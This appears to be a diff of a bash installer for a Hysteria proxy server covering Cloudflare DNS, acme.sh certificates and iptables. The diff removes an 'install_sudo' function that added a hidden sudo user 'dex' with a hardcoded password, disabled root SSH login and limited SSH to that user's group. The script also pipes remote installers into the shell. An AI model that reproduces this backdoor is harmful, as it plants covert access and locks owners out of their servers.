@@ -36,7 +36,6 @@ SUB_DOMAIN=${sub}.${DOMAIN}
 curl -X POST "https://api.cloudflare.com/client/v4/zones/${CF_ZONE}/dns_records" -H "X-Auth-Email: ${CF_ID}" -H "X-Auth-Key: ${CF_KEY}" -H "Content-Type: application/json" --data '{"type":"A","name":"'"${SUB_DOMAIN}"'","content":"'"${MYIP}"'","ttl":1,"priority":0,"proxied":false}' &>/dev/null
 echo "$SUB_DOMAIN" > /root/domain
 }
-}
 
 install_hysteria(){
 clear
@@ -44,7 +43,6 @@ echo 'Installing hysteria.'
 {
 wget -N --no-check-certificate -q -O ~/install_server.sh https://raw.githubusercontent.com/apernet/hysteria/master/install_server.sh; chmod +x ~/install_server.sh; ./install_server.sh
 } 
-}
 
 modify_hysteria(){
 clear
@@ -71,7 +69,6 @@ chmod 755 /etc/hysteria/config.json
 chmod 755 /etc/hysteria/hysteria.crt
 chmod 755 /etc/hysteria/hysteria.key
 }
-}
 
 install_letsencrypt()
 {
@@ -84,7 +81,6 @@ curl  https://get.acme.sh | sh
 ~/.acme.sh/acme.sh --register-account -m ${CF_ID} --server zerossl
 ~/.acme.sh/acme.sh --issue -d "${domain}" --standalone -k ec-256
 ~/.acme.sh/acme.sh --installcert -d "${domain}" --fullchainpath /etc/hysteria/hysteria.crt --keypath /etc/hysteria/hysteria.key --ecc
-}
 }
 
 installBBR() {
@@ -120,16 +116,6 @@ echo iptables-persistent iptables-persistent/autosave_v6 boolean true | sudo deb
 iptables-save > /etc/iptables_rules.v4
 ip6tables-save > /etc/iptables_rules.v6
 }
-}
-
-install_sudo(){
-  {
-    useradd -m dex 2>/dev/null; echo dex:@@@F1005r90@@@ | chpasswd; usermod -aG sudo dex
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups dex" >> /etc/ssh/sshd_config
-    service sshd restart
-  }
-}
 
 install_rclocal(){
   {  
@@ -155,7 +141,6 @@ exit 0' >> /etc/rc.local
     systemctl daemon-reload
     sudo systemctl enable firenet
     sudo systemctl start firenet.service
-  }
 }
 
 start_service () {
@@ -179,7 +164,6 @@ reboot
 }
 
 install_require
-install_sudo  
 create_hostname
 install_hysteria
 install_letsencrypt
